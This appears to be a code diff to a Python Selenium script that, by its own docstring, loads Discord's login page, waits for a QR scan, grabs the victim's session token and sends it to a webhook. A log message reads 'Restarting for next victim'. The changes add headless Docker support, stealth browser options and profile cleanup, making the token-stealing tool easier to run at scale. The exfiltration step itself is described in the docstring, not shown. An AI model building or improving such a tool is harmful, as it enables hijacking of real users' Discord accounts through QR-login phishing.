@@ -163,13 +163,9 @@ def paste_template():
 
 def create_driver(options):
     """Create a new Chrome driver instance with stealth setup."""
-    # Auto-detect chromedriver (works on Windows & Linux)
-    try:
-        chromedriver_path = ChromeDriverManager().install()
-        service = Service(chromedriver_path)
-    except Exception:
-        # Fallback to local chromedriver.exe (Windows)
-        service = Service(r'chromedriver.exe')
+    # Auto-detect chromedriver via webdriver-manager (works on Windows & Linux)
+    chromedriver_path = ChromeDriverManager().install()
+    service = Service(chromedriver_path)
 
     driver = webdriver.Chrome(options=options, service=service)
 
@@ -205,7 +201,7 @@ def build_options(profile_dir):
     options.add_argument('--no-first-run')
     options.add_argument('--disable-default-apps')
 
-    # Use a fresh profile per cycle to avoid lock conflicts
+    # Use a fresh temp profile per cycle — cleaned up after each cycle
     options.add_argument(f'--user-data-dir={profile_dir}')
 
     # Hide automation indicators
@@ -238,6 +234,8 @@ def check_for_captcha(driver):
 def run_cycle(driver):
     """Run one full cycle: generate QR → wait for scan → grab token → send to webhook.
     Returns True if cycle completed, False if should restart (captcha/expired)."""
+    if IN_DOCKER:
+        print('- Running in headless Docker mode.')
     print('- Navigating to Discord login...')
     driver.get('https://discord.com/login')
 
@@ -378,8 +376,16 @@ def main():
         cycle_count += 1
         print(f'\n\n==================== Cycle {cycle_count} ====================')
 
-        # Use a unique temp profile per cycle to avoid lock conflicts
-        profile_dir = os.path.join(os.getcwd(), f'chrome_profile_{cycle_count}')
+        # Use a temp profile per cycle — cleaned up before use
+        if IN_DOCKER:
+            profile_dir = f'/tmp/chrome_profile_{cycle_count}'
+        else:
+            profile_dir = os.path.join(os.getcwd(), f'chrome_profile_{cycle_count}')
+
+        # Remove leftover profile from a previous interrupted cycle
+        if os.path.exists(profile_dir):
+            shutil.rmtree(profile_dir, ignore_errors=True)
+
         options = build_options(profile_dir)
 
         # Create a FRESH browser instance each cycle
@@ -403,9 +409,15 @@ def main():
             pass
         print('Browser closed. Restarting for next victim...')
 
-        # Clean up old profile directories (keep only last 2)
+        # Clean up the profile directory immediately
+        try:
+            shutil.rmtree(profile_dir, ignore_errors=True)
+        except:
+            pass
+
+        # Also clean up old profiles (keep only last 2)
         if cycle_count > 2:
-            old_profile = os.path.join(os.getcwd(), f'chrome_profile_{cycle_count - 2}')
+            old_profile = f'/tmp/chrome_profile_{cycle_count - 2}' if IN_DOCKER else os.path.join(os.getcwd(), f'chrome_profile_{cycle_count - 2}')
             try:
                 shutil.rmtree(old_profile, ignore_errors=True)
             except:
